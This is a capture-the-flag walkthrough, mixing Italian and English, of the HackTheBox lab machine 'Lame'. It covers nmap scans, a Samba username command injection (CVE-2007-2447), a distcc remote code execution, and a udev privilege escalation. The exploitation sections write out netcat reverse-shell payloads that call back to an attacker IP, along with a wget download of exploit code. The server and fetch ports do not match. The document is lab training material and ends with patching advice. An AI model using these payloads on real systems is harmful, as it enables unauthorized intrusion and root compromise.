# Lame

## Reconnaissance

Per prima cosa eseguiamo una scansione iniziale con nmap per capire quali sono le porte aperte e quali sono i servizi che girano su di esse.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.3
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Le porte aperte sono le seguenti:

* **Porta 21:** File Transfer Protocol \(FTP\) versione 2.3.4
* **Porta 22:** OpenSSH versione 4.7p1
* **Porte 139 e 445:** Samba v3.0.20-Debian

<p align="center">
  <img src="/immagini/immagini-macchine-linux/lame-1.png" />
</p>

<p align="center">
  <img src="/immagini/immagini-macchine-linux/lame-2.png" />
</p>

Prima di iniziare a lavorare su queste porte, lanciamo una scansione nmap più completa in background.

```text
sudo nmap -sC -sV -O -p- -oA /usr/share/nmap/full 10.10.10.3
```

Di seguito il risultato della seconda scansione:

<p align="center">
  <img src="/immagini/immagini-macchine-linux/lame-3.png" />
</p>

Possiamo notare la presenza di una nuova porta che non veniva mostrata precedentemente.

* **Porta 3632**: distributed compiler daemon distcc versione 1.

Prima di completare questa fase, eseguiamo un'ultima scansione UDP.

```text
sudo nmap -sU -O -p- -oA /usr/share/nmap/udp 10.10.10.3
```

Dal risultato possiamo notare che tutte le porte sono filtrate o chiuse.

![](https://miro.medium.com/max/635/1*-SGvjjvid3UP15zWl8HouA.png)

Usciamo da questa fase con quattro differenti punti di ingresso per questa macchina.

## Enumeration

In questa fase cerchiamo di capire se qualcuno di questi servizi servizi è configurato in modo errato o se presenta vulnerabilità note.

### 1) Porta 21 vsftpd v2.3.4

Una semplice ricerca su google ci mostra che questa versione è vulnerabile all'esecuzione di un comando backdoor che viene attivato inserendo una stringa che contiene i caratteri “:\)” come nome utente.
Quando la backdoor viene attivata, la macchina di destinazione apre una shell sulla porta 6200.

E' possibile controllare l'effettiva vulnerabilità mediante uno script nmap.

<p align="center">
  <img src="/immagini/immagini-macchine-linux/lame-4.png" />
</p>

```text
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```

<p align="center">
  <img src="/immagini/immagini-macchine-linux/lame-5.png" />
</p>

Dall'output dello script capiamo che non è possibile sfruttare questa vulnerabilità.

### 2) Porta 22 OpenSSH v4.7p1

Anche qui effettuando una rapida ricerca su google mi sono imbattuto in questo progetto su git: [OpenSSH 4.7p1 CVE-2008-5161 Exploit](https://github.com/pankajjarial360/OpenSSH_4.7p1).

Lo script openssh_4.7p1.py controlla la versione del servizio SSH per confermare che sia in esecuzione OpenSSH versione 4.7p1. Se la versione è corretta, lo script imposta i parametri necessari per un attacco brute-force utilizzando un elenco di nomi utente e password presi da una specifica wordlist. Lo script quindi avvia l'exploit e attende che venga completato.

Una volta completato l'exploit, lo script recupera tutte le sessioni attive che sono state create e permette di interagire con la sessione.

Lanciamo lo script in background e proseguiamo con l'analisi dei restanti punti di ingresso.

```text
python openssh_4.7p1.py
```

Questa strada richiedeva troppo tempo.

### 3) Porte 139 e 445 Samba v3.0.20-Debian

Utilizziamo smbclient per accedere al server SMB.

```text
smbclient -L 10.10.10.3
```
* **-L**: lista dei serzi disponibili sul server

Possiamo notare che il client dal quale è stato eseguito il comando è configurato in maniera tale da non connettersi alle versioni SMB precedenti (per motivi di sicurezza).

Per ovviare a questo problema modifichiamo il comando nel modo seguente:

```text
smbclient -L 10.10.10.3 --option='client min protocol=NT1'
```
<p align="center">
  <img src="/immagini/immagini-macchine-linux/lame-6.png" />
</p>

E' disponibile il login anonimo.

Ora scopriamo i permessi sui drive condivisi.

```text
smbmap -H 10.10.10.3
```

* **-H**: IP dell'host

Abbiamo accesso di tipo READ/WRITE sulla cartella tmp.

<p align="center">
  <img src="/immagini/immagini-macchine-linux/lame-7.png" />
</p>

Eseguendo delle ricerche è stato possibile scoprire che questa versione è [vulnerabile](https://www.cvedetails.com/vulnerability-list/vendor_id-102/product_id-171/version_id-41384/Samba-Samba-3.0.20.html) (e non poco). We’re looking for a code execution vulnerability that would ideally give us Admin access. After going through all the code execution vulnerabilities, the simplest one that won’t require me to use Metasploit is [CVE-2007–2447](https://www.cvedetails.com/cve/CVE-2007-2447/).

The issue seems to be with the username field. If we send shell metacharacters into the username we exploit a vulnerability which allows us to execute arbitrary commands. Although the [exploit](https://www.exploit-db.com/exploits/16320) available on exploitdb uses Metasploit, reading through the code tells us that all the script is doing is running the following command, where “payload.encoded” would be a reverse shell sent back to our attack machine.

```text
"/=`nohup " + payload.encoded + "`"
```

Before we exploit this, let’s look at our last point of entry.

### 3) Port 3632 distcc v1

Googling “distcc v1” reveals that this service is vulnerable to a remote code execution and there’s an nmap script that can verify that.

```text
nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3
```

The result shows us that it’s vulnerable!

![](https://miro.medium.com/max/725/1*kPeaLZx-dDl2QuHjHg2GtA.png)

So we have two potential ways to exploit this machine.

## Exploitation \#1: Samba <a id="fcd7"></a>

Add a listener on attack machine.

```text
nc -nlvp 4444
```

Log into the smb client.

```text
smbclient //10.10.10.3/tmp
```

As mentioned in the previous section, we’ll send shell metacharacters into the username with a reverse shell payload.

```text
logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
```

The shell connects back to our attack machine and we have root! In this scenario, we didn’t need to escalate privileges.

![](https://miro.medium.com/max/719/1*DdvA5iSrtgHA7NTjHO527A.png)

Grab the user flag.

![](https://miro.medium.com/max/519/1*W-JJhSQNW8QMzh2M1XoUbA.png)

Grab the root flag.

![](https://miro.medium.com/max/572/1*EFS66PmJse9YpGTSus10wA.png)

## Exploitation \#2: Distcc <a id="714d"></a>

In the previous section, we saw that this service is vulnerable to CVE 2004–2687 and there’s an nmap script that can be used to exploit this vulnerability and run arbitrary commands on the target machine.

First, start a listener on the attack machine.

```text
nc -nlvp 4444
```

Then, use the nmap script to send a reverse shell back to the attack machine.

```text
nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.6 4444 -e /bin/bash'"
```

![](https://miro.medium.com/max/722/1*XGycXseoW7pDQLJnfN6PwA.png)

The shell connects back to our attack machine and we have a non privileged shell!

![](https://miro.medium.com/max/692/1*a6yMG05f7RV-LU2091HSBQ.png)

We’ll need to escalate privileges. Google the OS version — Linux 2.6.24 to see if it is vulnerable to any exploits. I tried [CVE 2016–5195](https://www.exploit-db.com/exploits/40839) and [CVE 2008–0600](https://www.exploit-db.com/exploits/5093), but they didn’t work.

Let’s try [CVE 2009–1185](https://www.exploit-db.com/exploits/8572). Download the exploit from searchsploit.

```text
searchsploit -m 8572.c
```

Start up a server on your attack machine.

```text
python -m SimpleHTTPServer 9005
```

In the target machine download the exploit file.

```text
wget http://10.10.14.6:5555/8572.c
```

Compile the exploit.

```text
gcc 8572.c -o 8572
```

To run it, let’s look at the usage instructions.

![](https://miro.medium.com/max/677/1*I7M6fBne0AtCu96yQhG2eQ.png)

We need to do two things:

* Figure out the PID of the udevd netlink socket
* Create a run file in /tmp and add a reverse shell to it. Since any payload in that file will run as root, we’ll get a privileged reverse shell.

To get the PID of the udevd process, run the following command.

```text
ps -aux | grep devd
```

![](https://miro.medium.com/max/784/1*4zJv2v2CWRwcyAuQ9PNjIA.png)

Similarly, you can get it through this file as mentioned in the instructions.

![](https://miro.medium.com/max/623/1*JIArJfTIn6IPx7J8jV6NUw.png)

Next, create a **run** file in /tmp and add a reverse shell to it.

![](https://miro.medium.com/max/471/1*SFdTIwhLSQtQX_jdSN7B_Q.png)

Confirm that the reverse shell was added correctly.

![](https://miro.medium.com/max/522/1*-77rPpCHax0hvwOo42FSWA.png)

Set up a listener on your attack machine to receive the reverse shell.

```text
nc -nlvp 4445
```

Run the exploit on the attack machine. As mentioned in the instructions, the exploit takes the PID of the udevd netlink socket as an argument.

```text
./8572 2661
```

We have root!

![](https://miro.medium.com/max/610/1*cW-sxid7icV3oHaN-5w3tQ.png)

We solved this machine in two different ways!

## Lessons Learned <a id="31ac"></a>

1. Always run a full port scan! We wouldn’t have discovered the vulnerable distributed compiler daemon distcc running on port 3632 if we only ran the initial scan. This gave us an initial foothold on the machine where we were eventually able to escalate privileges to root.
2. Always update and patch your software! In both exploitation methods, we leveraged publicly disclosed vulnerabilities that have security updates and patches available.
3. Samba ports should not be exposed! Use a firewall to deny access to these services from outside your network. Moreover, restrict access to your server to valid users only and disable WRITE access if not necessary.
